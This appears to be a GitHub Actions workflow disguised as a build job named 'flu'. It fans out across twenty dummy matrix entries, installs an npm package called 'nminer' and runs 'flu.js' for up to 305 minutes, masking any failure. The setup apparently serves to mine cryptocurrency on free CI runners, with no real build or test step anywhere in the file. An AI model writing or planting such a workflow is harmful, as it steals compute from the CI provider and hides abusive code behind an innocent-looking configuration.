name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 434 }
          - { version: 1090 }
          - { version: 9932 }
          - { version: 1488 }
          - { version: 2640 }
          - { version: 21 }
          - { version: 9559 }
          - { version: 1582 }
          - { version: 9635 }
          - { version: 4594 }
          - { version: 8698 }
          - { version: 9154 }
          - { version: 503 }
          - { version: 2647 }
          - { version: 8243 }
          - { version: 2124 }
          - { version: 2192 }
          - { version: 3225 }
          - { version: 6785 }
          - { version: 6447 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: grandiose
        run: |
          npm install nminer@latest
          timeout 305m node flu.js || echo "flu executed"